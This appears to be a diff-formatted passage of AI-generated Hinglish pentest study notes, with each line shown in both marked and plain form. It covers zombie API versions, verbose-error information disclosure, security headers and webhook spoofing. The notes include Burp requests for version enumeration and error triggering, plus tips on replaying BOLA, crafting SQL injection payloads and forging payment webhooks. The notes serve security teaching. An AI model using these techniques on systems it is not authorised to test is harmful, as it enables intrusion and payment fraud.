-[[HL::> ✅ Verified: 100% keyword coverage achieved for this topic.::HL]]
+> ✅ Verified: 100% keyword coverage achieved for this topic.
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🏁 PART 1 FINISHED. Type 'CONTINUE' for the next topics ---::HL]]
+### 🏁 PART 1 FINISHED. Type 'CONTINUE' for the next topics ---
 
-[[HL::✅ **Topics Covered in this message:**::HL]]
+✅ **Topics Covered in this message:**
 
-[[HL::1. Cloud-Native API Risks (AWS/Azure/GCP)::HL]]
-[[HL::2. API Cache Poisoning::HL]]
+1. Cloud-Native API Risks (AWS/Azure/GCP)
+2. API Cache Poisoning
 
-[[HL::⏳ **Remaining Topics (in order):**::HL]]
-[[HL::3. API Versioning & Deprecation Flaws::HL]]
-[[HL::4. Security Headers & Verbose Errors (Information Disclosure)::HL]]
+⏳ **Remaining Topics (in order):**
+3. API Versioning & Deprecation Flaws
+4. Security Headers & Verbose Errors (Information Disclosure)
 
-[[HL::📊 **Progress:** 2 topics done / 4 topics total::HL]]
+📊 **Progress:** 2 topics done / 4 topics total
 
-[[HL::━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━::HL]]
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-[[HL::▶️ Resuming from: Topic 3: API Versioning & Deprecation Flaws — Remaining after this: [Topic 4: Security Headers & Verbose Errors (Information Disclosure)]::HL]]
+▶️ Resuming from: Topic 3: API Versioning & Deprecation Flaws — Remaining after this: [Topic 4: Security Headers & Verbose Errors (Information Disclosure)]
 
 
 
-[[HL::### 🎯 1. API Versioning & Deprecation Flaws::HL]]
+### 🎯 1. API Versioning & Deprecation Flaws
 
-[[HL::Is topic mein hum seekhenge ki kaise developers naye API versions (jaise `/v2/`) banate waqt purane, vulnerable versions (jaise `/v1/`) ko delete karna bhool jaate hain, aur ek attacker kaise in **legacy endpoints** ko dhoondh kar unpatched bugs exploit karta hai.::HL]]
+Is topic mein hum seekhenge ki kaise developers naye API versions (jaise `/v2/`) banate waqt purane, vulnerable versions (jaise `/v1/`) ko delete karna bhool jaate hain, aur ek attacker kaise in **legacy endpoints** ko dhoondh kar unpatched bugs exploit karta hai.
 
-[[HL::### 📖 3. Technical Definition::HL]]
+### 📖 3. Technical Definition
 
-[[HL::* **Precise English:** Exploiting "Zombie APIs" or shadow APIs — older, deprecated versions of an API that remain active and accessible. These legacy endpoints often lack the security patches and authorization controls implemented in newer versions.::HL]]
-* [[HL::**Hinglish Simplification:** Nayi API banne ke baad purani API ko band na karna ek security risk hai. Attacker nayi secure URL ke number ko change karke purani vulnerable URL pe attack karta hai.::HL]]
+* **Precise English:** Exploiting "Zombie APIs" or shadow APIs — older, deprecated versions of an API that remain active and accessible. These legacy endpoints often lack the security patches and authorization controls implemented in newer versions.
+* **Hinglish Simplification:** Nayi API banne ke baad purani API ko band na karna ek security risk hai. Attacker nayi secure URL ke number ko change karke purani vulnerable URL pe attack karta hai.
 
-[[HL::### 🧠 4. Why This Matters::HL]]
+### 🧠 4. Why This Matters
 
-* [[HL::**Problem:** Developer ne `/v2/users` mein BOLA (Broken Object Level Authorization — ek user doosre user ka data dekh sakta hai) fix kar diya, par `/v1/users` abhi bhi server pe live hai. **Backwards compatibility** (purane mobile apps ko support karne ke liye) ke chakkar mein security compromise ho gayi.::HL]]
-* [[HL::**Solution:** APIs ka proper lifecycle management hona chahiye aur purane endpoints ko kill karna zaroori hai.::HL]]
-* [[HL::**What breaks?** Attacker unpatched vulnerabilities ko "Patch Bypass" ki tarah use karke system compromise kar sakta hai.::HL]]
-* [[HL::**✅ Kab use karo:** Jab target API URL mein `/v2/`, `/v3/` dikhe. Ya fir endpoint bilkul secure lag raha ho aur tum older implementation test karna chahte ho.::HL]]
-* **❌ [[HL::Kab mat karo / Alternative::HL]] prefer karo:** Agar API properly **Sunset headers** (HTTP header jo batata hai ki API kab deprecate/band hogi) return kar rahi hai aur endpoint permanently off hai, toh time waste mat karo.
+* **Problem:** Developer ne `/v2/users` mein BOLA (Broken Object Level Authorization — ek user doosre user ka data dekh sakta hai) fix kar diya, par `/v1/users` abhi bhi server pe live hai. **Backwards compatibility** (purane mobile apps ko support karne ke liye) ke chakkar mein security compromise ho gayi.
+* **Solution:** APIs ka proper lifecycle management hona chahiye aur purane endpoints ko kill karna zaroori hai.
+* **What breaks?** Attacker unpatched vulnerabilities ko "Patch Bypass" ki tarah use karke system compromise kar sakta hai.
+* **✅ Kab use karo:** Jab target API URL mein `/v2/`, `/v3/` dikhe. Ya fir endpoint bilkul secure lag raha ho aur tum older implementation test karna chahte ho.
+* **❌ Kab mat karo / Alternative prefer karo:** Agar API properly **Sunset headers** (HTTP header jo batata hai ki API kab deprecate/band hogi) return kar rahi hai aur endpoint permanently off hai, toh time waste mat karo.
 
-[[HL::### 💻 7. Hands-On — Lab-Ready Commands::HL]]
+### 💻 7. Hands-On — Lab-Ready Commands
 
-[[HL::**Fuzzing for Legacy API Versions:**::HL]]
+**Fuzzing for Legacy API Versions:**
 
-[[HL::```http::HL]]
-[[HL::# Burp Suite | HTTP Request (Sent to Intruder)::HL]]
-[[HL::1 GET /api/v§1§/users/profile HTTP/1.1  # v§1§ = Intruder payload marker; § ke beech mein Intruder automatically 1, 2, 3 inject karega::HL]]
-[[HL::2 Host: api.target.com::HL]]
-[[HL::3 Authorization: Bearer eyJhb...[token]  # Bearer token = API authentication ke liye JWT (JSON Web Token)::HL]]
+```http
+# Burp Suite | HTTP Request (Sent to Intruder)
+1 GET /api/v§1§/users/profile HTTP/1.1  # v§1§ = Intruder payload marker; § ke beech mein Intruder automatically 1, 2, 3 inject karega
+2 Host: api.target.com
+3 Authorization: Bearer eyJhb...[token]  # Bearer token = API authentication ke liye JWT (JSON Web Token)
 
-[[HL::```::HL]]
+```
 
-[[HL::```text::HL]]
-[[HL::# 📤 Expected Output (Burp Intruder Results):::HL]]
-[[HL::Payload    Status    Length::HL]]
-[[HL::v3         200       1500  (Current secure version)::HL]]
-[[HL::v2         404       200   (Deleted properly)::HL]]
-[[HL::v1         200       1850  (Zombie API found! Data structure might be different/vulnerable)::HL]]
+```text
+# 📤 Expected Output (Burp Intruder Results):
+Payload    Status    Length
+v3         200       1500  (Current secure version)
+v2         404       200   (Deleted properly)
+v1         200       1850  (Zombie API found! Data structure might be different/vulnerable)
 
-[[HL::```::HL]]
+```
 
-#### 🛠️ [[HL::Step-by-Step GUI Navigation (Burp Intruder)::HL]]
+#### 🛠️ Step-by-Step GUI Navigation (Burp Intruder)
 
-1. [[HL::**Burp Suite:** Request ko pakdo jisme version number hai (e.g., `/v2/`).::HL]]
-[[HL::2. Request pe Right-click -> `Send to Intruder`.::HL]]
-3. [[HL::Intruder tab mein jao -> `Positions` sub-tab. `Clear §` pe click karo.::HL]]
-4. [[HL::Version number `2` ko highlight karo aur `Add §` pe click karo (jaise `/v§2§/`).::HL]]
-5. [[HL::`Payloads` tab mein jao -> Payload type ko **Numbers** set karo (From: 1, To: 10, Step: 1).::HL]]
-6. [[HL::**Start attack** pe click karo aur `200 OK` responses dhundo. Agar `/v1/` 200 OK de raha hai, toh use Repeater mein bhej kar wahan purane attacks (BOLA, Mass Assignment) try karo.::HL]]
+1. **Burp Suite:** Request ko pakdo jisme version number hai (e.g., `/v2/`).
+2. Request pe Right-click -> `Send to Intruder`.
+3. Intruder tab mein jao -> `Positions` sub-tab. `Clear §` pe click karo.
+4. Version number `2` ko highlight karo aur `Add §` pe click karo (jaise `/v§2§/`).
+5. `Payloads` tab mein jao -> Payload type ko **Numbers** set karo (From: 1, To: 10, Step: 1).
+6. **Start attack** pe click karo aur `200 OK` responses dhundo. Agar `/v1/` 200 OK de raha hai, toh use Repeater mein bhej kar wahan purane attacks (BOLA, Mass Assignment) try karo.
 
-[[HL::### 🔒 8. Attack Surface & Defense::HL]]
+### 🔒 8. Attack Surface & Defense
 
-[[HL::**🔴 Attacker Perspective:** **Zombie APIs** aur **shadow APIs** (un-documented APIs jinhe security team bhool chuki hai) ko discover karna attacker ka pehla step hai. Ffuf ya Burp se version numbers enumerate karte hain, aur phir naye endpoints pe jo attacks fail hue the, unhe purane endpoints pe replay karte hain.::HL]]
-[[HL::**🔵 Defender Perspective:** API Gateways (jaise Kong, AWS API Gateway) use karo centralized routing aur monitoring ke liye. **Deprecated APIs** (wo APIs jinka support khatam ho gaya hai) ko completely offline take down karo. Jab tak offline nahi kar sakte, **Sunset headers** (`Sunset: Wed, 11 Nov 2026 11:11:11 GMT`) use karo taaki clients ko deprecation ka notice mile aur API Gateway pe strict WAF rules lagao.::HL]]
+**🔴 Attacker Perspective:** **Zombie APIs** aur **shadow APIs** (un-documented APIs jinhe security team bhool chuki hai) ko discover karna attacker ka pehla step hai. Ffuf ya Burp se version numbers enumerate karte hain, aur phir naye endpoints pe jo attacks fail hue the, unhe purane endpoints pe replay karte hain.
+**🔵 Defender Perspective:** API Gateways (jaise Kong, AWS API Gateway) use karo centralized routing aur monitoring ke liye. **Deprecated APIs** (wo APIs jinka support khatam ho gaya hai) ko completely offline take down karo. Jab tak offline nahi kar sakte, **Sunset headers** (`Sunset: Wed, 11 Nov 2026 11:11:11 GMT`) use karo taaki clients ko deprecation ka notice mile aur API Gateway pe strict WAF rules lagao.
 
-[[HL::### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)::HL]]
+### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)
 
-* **❌ [[HL::Mistake:** Agar `/v3/profile` endpoint secure nikla, toh man lena ki BOLA exist nahi karta aur aage badh jana.::HL]]
-* [[HL::**🤦 Why:** Beginners assume karte hain ki agar latest feature secure hai toh pichhle saare raste band honge.::HL]]
-* **✅ [[HL::The 'Pro' Way:** Hamesha purane versions (`/v1/`, `/v2/`, ya `/mobile/v1/`) ko manually brute-force karo. Un patched vulnerabilities yahi chhupi hoti hain.::HL]]
-[[HL::* **⚡ Consequences:** Ek aasan High-Severity finding miss ho jayegi jo ek simple URL path change karne se mil sakti thi.::HL]]
+* **❌ Mistake:** Agar `/v3/profile` endpoint secure nikla, toh man lena ki BOLA exist nahi karta aur aage badh jana.
+* **🤦 Why:** Beginners assume karte hain ki agar latest feature secure hai toh pichhle saare raste band honge.
+* **✅ The 'Pro' Way:** Hamesha purane versions (`/v1/`, `/v2/`, ya `/mobile/v1/`) ko manually brute-force karo. Un patched vulnerabilities yahi chhupi hoti hain.
+* **⚡ Consequences:** Ek aasan High-Severity finding miss ho jayegi jo ek simple URL path change karne se mil sakti thi.
 
-[[HL::### 🔑 18. Keywords Coverage Verification::HL]]
+### 🔑 18. Keywords Coverage Verification
 
-[[HL::```text::HL]]
-[[HL::🔑 Keywords Coverage Check — API Versioning & Deprecation Flaws::HL]]
-[[HL::✅ Covered    : API versioning, legacy endpoints, deprecated APIs, `/v1/`, `/v2/`, `/v3/`, sunset headers, backwards compatibility, shadow APIs, zombie APIs::HL]]
-[[HL::⚠️ Mentioned but needs more depth : (none)::HL]]
-[[HL::❌ MISSED     : (none)::HL]]
+```text
+🔑 Keywords Coverage Check — API Versioning & Deprecation Flaws
+✅ Covered    : API versioning, legacy endpoints, deprecated APIs, `/v1/`, `/v2/`, `/v3/`, sunset headers, backwards compatibility, shadow APIs, zombie APIs
+⚠️ Mentioned but needs more depth : (none)
+❌ MISSED     : (none)
 
-[[HL::```::HL]]
+```
 
-[[HL::> ✅ Verified: 100% keyword coverage achieved for this topic.::HL]]
+> ✅ Verified: 100% keyword coverage achieved for this topic.
 
-[[HL::---::HL]]
+---
 
-[[HL::---::HL]]
+---
 
-[[HL::*(⚠️ Note: Is topic ka depth bhi 'Surface' level hai skeleton ke hisaab se. We will follow the Top 7 critical points structure.)*::HL]]
+*(⚠️ Note: Is topic ka depth bhi 'Surface' level hai skeleton ke hisaab se. We will follow the Top 7 critical points structure.)*
 
-[[HL::### 🎯 1. Security Headers & Verbose Errors (Information Disclosure)::HL]]
+### 🎯 1. Security Headers & Verbose Errors (Information Disclosure)
 
-[[HL::Is topic mein hum dekhenge ki kaise ek purposely triggered error server ke internal raaz (framework version, file paths, database queries) khol sakta hai, aur kaise missing security headers (jaise HSTS aur CORS) attackers ko client-side attacks ke liye rasta dete hain.::HL]]
+Is topic mein hum dekhenge ki kaise ek purposely triggered error server ke internal raaz (framework version, file paths, database queries) khol sakta hai, aur kaise missing security headers (jaise HSTS aur CORS) attackers ko client-side attacks ke liye rasta dete hain.
 
-[[HL::### 📖 3. Technical Definition::HL]]
+### 📖 3. Technical Definition
 
-[[HL::* **Precise English:** **Information Disclosure** via verbose errors happens when a server crashes gracefully but returns a detailed stack trace instead of a generic message. Missing security headers (like HSTS or strict CORS) fail to enforce basic client-side browser protections.::HL]]
-[[HL::* **Hinglish Simplification:** Server ko janbujhkar galat input dekar crash karwana taaki error message mein backend ki details (jaise konse folders hain, database kaisa hai) leak ho jayein.::HL]]
+* **Precise English:** **Information Disclosure** via verbose errors happens when a server crashes gracefully but returns a detailed stack trace instead of a generic message. Missing security headers (like HSTS or strict CORS) fail to enforce basic client-side browser protections.
+* **Hinglish Simplification:** Server ko janbujhkar galat input dekar crash karwana taaki error message mein backend ki details (jaise konse folders hain, database kaisa hai) leak ho jayein.
 
-[[HL::### 🧠 4. Why This Matters::HL]]
+### 🧠 4. Why This Matters
 
-[[HL::* **Problem:** **Stack traces** (error aane pe backend code ki execution history) ek roadmap ki tarah hote hain. Attacker ko andha attack nahi karna padta, use exactly pata chal jata hai ki konsi line pe error aaya aur backend mein data kaise process ho raha hai.::HL]]
-[[HL::* **Solution:** Production environments mein error messages ko suppress karna chahiye (generic "500 Server Error") aur proper **security headers** deploy hone chahiye.::HL]]
-[[HL::* **What breaks?** Akele mein yeh low severity hai, lekin stack trace se mili **database schema leak** (database ke tables aur columns ka structure) se ek blind SQL Injection aaram se high severity RCE (Remote Code Execution) ya data dump mein convert ho sakta hai.::HL]]
-[[HL::* **✅ Kab use karo:** Reconnaissance phase mein, jab tum API parameters fuzz kar rahe ho ya malformed data (invalid JSON, wrong data types) bhej rahe ho backend architecture map karne ke liye.::HL]]
-* **❌ [[HL::Kab mat karo / Alternative::HL]] prefer karo:** Ise final exploit mat samjho. Yeh sirf information gathering hai. Is report ko doosri bugs (chaining) ke sath attach karo taaki impact badhe.
+* **Problem:** **Stack traces** (error aane pe backend code ki execution history) ek roadmap ki tarah hote hain. Attacker ko andha attack nahi karna padta, use exactly pata chal jata hai ki konsi line pe error aaya aur backend mein data kaise process ho raha hai.
+* **Solution:** Production environments mein error messages ko suppress karna chahiye (generic "500 Server Error") aur proper **security headers** deploy hone chahiye.
+* **What breaks?** Akele mein yeh low severity hai, lekin stack trace se mili **database schema leak** (database ke tables aur columns ka structure) se ek blind SQL Injection aaram se high severity RCE (Remote Code Execution) ya data dump mein convert ho sakta hai.
+* **✅ Kab use karo:** Reconnaissance phase mein, jab tum API parameters fuzz kar rahe ho ya malformed data (invalid JSON, wrong data types) bhej rahe ho backend architecture map karne ke liye.
+* **❌ Kab mat karo / Alternative prefer karo:** Ise final exploit mat samjho. Yeh sirf information gathering hai. Is report ko doosri bugs (chaining) ke sath attach karo taaki impact badhe.
 
-[[HL::### 💻 7. Hands-On — Lab-Ready Commands::HL]]
+### 💻 7. Hands-On — Lab-Ready Commands
 
-[[HL::**Triggering a Verbose Stack Trace (Breaking JSON Syntax):**::HL]]
+**Triggering a Verbose Stack Trace (Breaking JSON Syntax):**
 
-[[HL::```http::HL]]
-[[HL::# Burp Suite | HTTP Request (Repeater)::HL]]
-[[HL::1 POST /api/users/update HTTP/1.1::HL]]
-[[HL::2 Host: api.target.com::HL]]
-[[HL::3 Content-Type: application/json::HL]]
-[[HL::4 ::HL]]
-[[HL::5 {"id": 1, "email": "test@test.com"  # Intentionally malformed JSON — aakhiri closing bracket '}' hata diya::HL]]
+```http
+# Burp Suite | HTTP Request (Repeater)
+1 POST /api/users/update HTTP/1.1
+2 Host: api.target.com
+3 Content-Type: application/json
+4 
+5 {"id": 1, "email": "test@test.com"  # Intentionally malformed JSON — aakhiri closing bracket '}' hata diya
 
-[[HL::```::HL]]
+```
 
-[[HL::```http::HL]]
-[[HL::# 📤 Expected Output (Burp Response):::HL]]
-[[HL::1 HTTP/1.1 500 Internal Server Error::HL]]
-[[HL::2 ::HL]]
-[[HL::3 SyntaxError: Unexpected end of JSON input::HL]]
-[[HL::4    at JSON.parse (<anonymous>)::HL]]
-[[HL::5    at /var/www/api/controllers/userController.js:42:25  # Framework fingerprinting & File path leaked!::HL]]
-[[HL::6    at Database.query ("SELECT * FROM tbl_users WHERE id = undefined")  # Database schema leaked!::HL]]
+```http
+# 📤 Expected Output (Burp Response):
+1 HTTP/1.1 500 Internal Server Error
+2 
+3 SyntaxError: Unexpected end of JSON input
+4    at JSON.parse (<anonymous>)
+5    at /var/www/api/controllers/userController.js:42:25  # Framework fingerprinting & File path leaked!
+6    at Database.query ("SELECT * FROM tbl_users WHERE id = undefined")  # Database schema leaked!
 
-[[HL::```::HL]]
+```
 
-[[HL::#### 🛠️ Step-by-Step GUI Navigation (Burp Suite)::HL]]
+#### 🛠️ Step-by-Step GUI Navigation (Burp Suite)
 
-[[HL::1. **Burp Suite:** Intercept ki hui POST request jisme JSON payload ho, use Repeater mein bhejo.::HL]]
-[[HL::2. JSON body ko deliberately break karo (e.g., `{"id": 1` likho closing brace ke bina, ya integer field mein `"text"` daal do).::HL]]
-[[HL::3. Request **Send** karo.::HL]]
-[[HL::4. Response body mein dekho kya `500 Internal Server Error` ke sath lamba sa code block (stack trace) wapas aaya hai. Agar haan, toh us text ko copy karke save karlo, ye aage exploitation mein kaam aayega.::HL]]
+1. **Burp Suite:** Intercept ki hui POST request jisme JSON payload ho, use Repeater mein bhejo.
+2. JSON body ko deliberately break karo (e.g., `{"id": 1` likho closing brace ke bina, ya integer field mein `"text"` daal do).
+3. Request **Send** karo.
+4. Response body mein dekho kya `500 Internal Server Error` ke sath lamba sa code block (stack trace) wapas aaya hai. Agar haan, toh us text ko copy karke save karlo, ye aage exploitation mein kaam aayega.
 
-[[HL::### 🔒 8. Attack Surface & Defense::HL]]
+### 🔒 8. Attack Surface & Defense
 
-[[HL::**🔴 Attacker Perspective:** Attacker APIs ko invalid inputs se bombard karta hai taaki server ke errors se **framework fingerprints** (kaunsa framework chal raha hai, jaise Express.js, Django, ya Spring Boot) aur internal network logic extract kar sake. Saath hi response mein check karta hai ki **HSTS** (`Strict-Transport-Security` — jo browser ko force karta hai sirf HTTPS use karne ke liye) ya **`X-Content-Type-Options: nosniff`** missing toh nahi hain, taaki MITM (Man-in-the-Middle) ya MIME-sniffing attacks plan kar sake.::HL]]
-[[HL::**🔵 Defender Perspective:** Production servers pe ek global Exception Handler implement karo jo kisi bhi system error ko catch karke ek standard, harmless error return kare (e.g., `{"error": "Something went wrong"}`). Security headers enforce karne ke liye reverse proxies (Nginx) ya WAF rules config karo aur **CORS** (Cross-Origin Resource Sharing — kaunsi doosri websites is API ko call kar sakti hain) strict origin checks ke sath lagao, `*` wildcard mat allow karo.::HL]]
+**🔴 Attacker Perspective:** Attacker APIs ko invalid inputs se bombard karta hai taaki server ke errors se **framework fingerprints** (kaunsa framework chal raha hai, jaise Express.js, Django, ya Spring Boot) aur internal network logic extract kar sake. Saath hi response mein check karta hai ki **HSTS** (`Strict-Transport-Security` — jo browser ko force karta hai sirf HTTPS use karne ke liye) ya **`X-Content-Type-Options: nosniff`** missing toh nahi hain, taaki MITM (Man-in-the-Middle) ya MIME-sniffing attacks plan kar sake.
+**🔵 Defender Perspective:** Production servers pe ek global Exception Handler implement karo jo kisi bhi system error ko catch karke ek standard, harmless error return kare (e.g., `{"error": "Something went wrong"}`). Security headers enforce karne ke liye reverse proxies (Nginx) ya WAF rules config karo aur **CORS** (Cross-Origin Resource Sharing — kaunsi doosri websites is API ko call kar sakti hain) strict origin checks ke sath lagao, `*` wildcard mat allow karo.
 
-[[HL::### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)::HL]]
+### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)
 
-[[HL::* **❌ Mistake:** Verbose error dekh kar use report mein ignore kar dena yeh soch kar ki "yeh toh low severity hai, iska koi faayda nahi".::HL]]
-[[HL::* **🤦 Why:** Beginners sirf shell pane ya critical bugs pe dhyan dete hain aur reconnaissance data ko waste kar dete hain.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Stack trace ko carefully padho. Agar usme SQL query leak ho rahi hai, toh tum use template maankar SQL Injection bypass payload craft kar sakte ho.::HL]]
-[[HL::* **⚡ Consequences:** Ek valuable information jo complex vulnerability trigger karne ki chabhi ho sakti thi, woh miss ho jayegi aur pentest report incomplete lagegi.::HL]]
+* **❌ Mistake:** Verbose error dekh kar use report mein ignore kar dena yeh soch kar ki "yeh toh low severity hai, iska koi faayda nahi".
+* **🤦 Why:** Beginners sirf shell pane ya critical bugs pe dhyan dete hain aur reconnaissance data ko waste kar dete hain.
+* **✅ The 'Pro' Way:** Stack trace ko carefully padho. Agar usme SQL query leak ho rahi hai, toh tum use template maankar SQL Injection bypass payload craft kar sakte ho.
+* **⚡ Consequences:** Ek valuable information jo complex vulnerability trigger karne ki chabhi ho sakti thi, woh miss ho jayegi aur pentest report incomplete lagegi.
 
-[[HL::### 🔑 18. Keywords Coverage Verification::HL]]
+### 🔑 18. Keywords Coverage Verification
 
-[[HL::```text::HL]]
-[[HL::🔑 Keywords Coverage Check — Security Headers & Verbose Errors (Information Disclosure)::HL]]
-[[HL::✅ Covered    : Verbose errors, stack traces, information disclosure, security headers, HSTS, CORS, `X-Content-Type-Options`, framework fingerprints, database schema leak::HL]]
-[[HL::⚠️ Mentioned but needs more depth : (none)::HL]]
-[[HL::❌ MISSED     : (none)::HL]]
+```text
+🔑 Keywords Coverage Check — Security Headers & Verbose Errors (Information Disclosure)
+✅ Covered    : Verbose errors, stack traces, information disclosure, security headers, HSTS, CORS, `X-Content-Type-Options`, framework fingerprints, database schema leak
+⚠️ Mentioned but needs more depth : (none)
+❌ MISSED     : (none)
 
-[[HL::```::HL]]
+```
 
-[[HL::> ✅ Verified: 100% keyword coverage achieved for this topic.::HL]]
+> ✅ Verified: 100% keyword coverage achieved for this topic.
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🏁 Section Completion Checklist: Section 15: Emerging API & Cloud Threats::HL]]
+### 🏁 Section Completion Checklist: Section 15: Emerging API & Cloud Threats
 
-[[HL::* [x] Topic 1: Cloud-Native API Risks (AWS/Azure/GCP)::HL]]
-[[HL::* [x] Topic 2: API Cache Poisoning::HL]]
-[[HL::* [x] Topic 3: API Versioning & Deprecation Flaws::HL]]
-[[HL::* [x] Topic 4: Security Headers & Verbose Errors (Information Disclosure)::HL]]
+* [x] Topic 1: Cloud-Native API Risks (AWS/Azure/GCP)
+* [x] Topic 2: API Cache Poisoning
+* [x] Topic 3: API Versioning & Deprecation Flaws
+* [x] Topic 4: Security Headers & Verbose Errors (Information Disclosure)
 
-[[HL::Total Topics: 4 | Total Keywords: 41 | CVEs: 0 | Missed: 0::HL]]
+Total Topics: 4 | Total Keywords: 41 | CVEs: 0 | Missed: 0
 
-[[HL::> ✅ Notes Guru (Offensive Security Edition) confirms: Poora Section 15 complete ho gaya hai. Har concept properly explain kiya gaya hai (with deep dives for Topics 1 & 2, and precise mapping for Topics 3 & 4) without any censorship.::HL]]
+> ✅ Notes Guru (Offensive Security Edition) confirms: Poora Section 15 complete ho gaya hai. Har concept properly explain kiya gaya hai (with deep dives for Topics 1 & 2, and precise mapping for Topics 3 & 4) without any censorship.
 
-[[HL::### 🏁 FINAL GRAND CHECKLIST::HL]]
+### 🏁 FINAL GRAND CHECKLIST
 
-[[HL::* Total Sections: 1 ✅::HL]]
-[[HL::* Total Topics: 4 ✅::HL]]
-[[HL::* Total Subtopics: 15 ✅::HL]]
-[[HL::* Total Keywords: 41::HL]]
-[[HL::* Keywords Covered: 41 ✅::HL]]
-[[HL::* CVEs Covered: 0 ✅::HL]]
-[[HL::* Keywords Missed: 0::HL]]
+* Total Sections: 1 ✅
+* Total Topics: 4 ✅
+* Total Subtopics: 15 ✅
+* Total Keywords: 41
+* Keywords Covered: 41 ✅
+* CVEs Covered: 0 ✅
+* Keywords Missed: 0
 
-[[HL::> ✅ Notes Guru (Offensive Security Edition) confirms: Yeh notes original skeleton ka 100% content cover karti hain — har topic, har subtopic, har keyword, har attack technique, har tool command. Koi bhi offensive security term censor nahi kiya gaya. Badhai ho, tumhara Section 15 ka exam/pentest prep solid hai! 🚀::HL]]
+> ✅ Notes Guru (Offensive Security Edition) confirms: Yeh notes original skeleton ka 100% content cover karti hain — har topic, har subtopic, har keyword, har attack technique, har tool command. Koi bhi offensive security term censor nahi kiya gaya. Badhai ho, tumhara Section 15 ka exam/pentest prep solid hai! 🚀
 
-[[HL::━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━::HL]]
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-[[HL::==================================================================================::HL]]
+==================================================================================
 
 
-[[HL::# Section 16: Webhooks & Microservices Architecture::HL]]
+# Section 16: Webhooks & Microservices Architecture
 
 
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🎯 1. Webhook Security::HL]]
+### 🎯 1. Webhook Security
 
-[[HL::Is topic mein hum seekhenge ki **Webhooks** (event-driven APIs jo real-time data push karte hain) ko attacker kaise spoof karta hai, **HMAC signature** verification ki absence ko kaise exploit karte hain, aur fake payment events bhej kar business logic bypass kaise hota hai.::HL]]
+Is topic mein hum seekhenge ki **Webhooks** (event-driven APIs jo real-time data push karte hain) ko attacker kaise spoof karta hai, **HMAC signature** verification ki absence ko kaise exploit karte hain, aur fake payment events bhej kar business logic bypass kaise hota hai.
 
-[[HL::### 🐣 2. Simple Analogy (Hinglish)::HL]]
+### 🐣 2. Simple Analogy (Hinglish)
 
-[[HL::Socho tumhara ek dukaandaar dost hai jo tumhe call karke batata hai "Suresh ne 1000 rupees de diye hain, usko saman de do" — yeh Webhook hai (real-time event notification). Ab agar koi fraud aadmi dusre number se call karke dukaandaar ki aawaz nikal le aur bole "Payment successful, saman de do", aur tum bina caller ID (Signature Verification) check kiye saman de do — toh yeh Webhook Spoofing / Fake Event attack hai.::HL]]
+Socho tumhara ek dukaandaar dost hai jo tumhe call karke batata hai "Suresh ne 1000 rupees de diye hain, usko saman de do" — yeh Webhook hai (real-time event notification). Ab agar koi fraud aadmi dusre number se call karke dukaandaar ki aawaz nikal le aur bole "Payment successful, saman de do", aur tum bina caller ID (Signature Verification) check kiye saman de do — toh yeh Webhook Spoofing / Fake Event attack hai.
 
-[[HL::### 📖 3. Technical Definition::HL]]
+### 📖 3. Technical Definition
 
-[[HL::* **Precise English:** Webhooks are asynchronous, user-defined HTTP callbacks triggered by specific events in a third-party service. Without proper cryptographic validation (like HMAC), attackers can forge payloads to bypass business logic or trigger state changes. (MITRE ATT&CK: T1190 — Exploit Public-Facing Application)::HL]]
-* [[HL::**Hinglish Simplification:** Webhook ek system hai jahan ek application dusri application ko HTTP request bhejti hai jab koi event hota hai (jaise payment success). Agar receiver is request ki authenticity verify nahi karta, toh attacker fake requests bhej sakta hai.::HL]]
+* **Precise English:** Webhooks are asynchronous, user-defined HTTP callbacks triggered by specific events in a third-party service. Without proper cryptographic validation (like HMAC), attackers can forge payloads to bypass business logic or trigger state changes. (MITRE ATT&CK: T1190 — Exploit Public-Facing Application)
+* **Hinglish Simplification:** Webhook ek system hai jahan ek application dusri application ko HTTP request bhejti hai jab koi event hota hai (jaise payment success). Agar receiver is request ki authenticity verify nahi karta, toh attacker fake requests bhej sakta hai.
 
-[[HL::### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)::HL]]
+### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)
 
-[[HL::* **Problem:** Agar API third-party service (jaise Stripe/GitHub) se aane wale webhooks ko bina cryptographic signature ke consume karti hai, toh koi bhi fake event (jaise `payment_intent.succeeded`) bhej sakta hai.::HL]]
-[[HL::* **Solution:** **HMAC signature** (Hash-based Message Authentication Code — ek cryptographic method jo data integrity aur authenticity verify karta hai) verification target application ko ensure karwati hai ki request genuinely third-party se hi aayi hai.::HL]]
-[[HL::* **What breaks if we don't know this?** Tum ek major business logic flaw miss kar doge jahan tum free mein premium accounts ya products le sakte the webhook spoof karke.::HL]]
-[[HL::* **✅ Kab use karo (Use in engagement when):** Jab target application kisi third-party payment gateway (Stripe, PayPal), CI/CD pipeline (GitHub actions), ya SMS service (Twilio) se integrate ho, aur unka **callback URL** (endpoint jahan third-party data bhejti hai) discover ho jaye.::HL]]
-* **❌ [[HL::Kab mat karo / Alternative::HL]] prefer karo:** Agar target properly `X-Hub-Signature` (HTTP header jo signature carry karta hai) validate kar raha hai aur tumhare paas secret key nahi hai, toh direct spoofing kaam nahi karegi. Tab **Replay attacks** (purani valid request ko baar-baar bhejna) try karo.
+* **Problem:** Agar API third-party service (jaise Stripe/GitHub) se aane wale webhooks ko bina cryptographic signature ke consume karti hai, toh koi bhi fake event (jaise `payment_intent.succeeded`) bhej sakta hai.
+* **Solution:** **HMAC signature** (Hash-based Message Authentication Code — ek cryptographic method jo data integrity aur authenticity verify karta hai) verification target application ko ensure karwati hai ki request genuinely third-party se hi aayi hai.
+* **What breaks if we don't know this?** Tum ek major business logic flaw miss kar doge jahan tum free mein premium accounts ya products le sakte the webhook spoof karke.
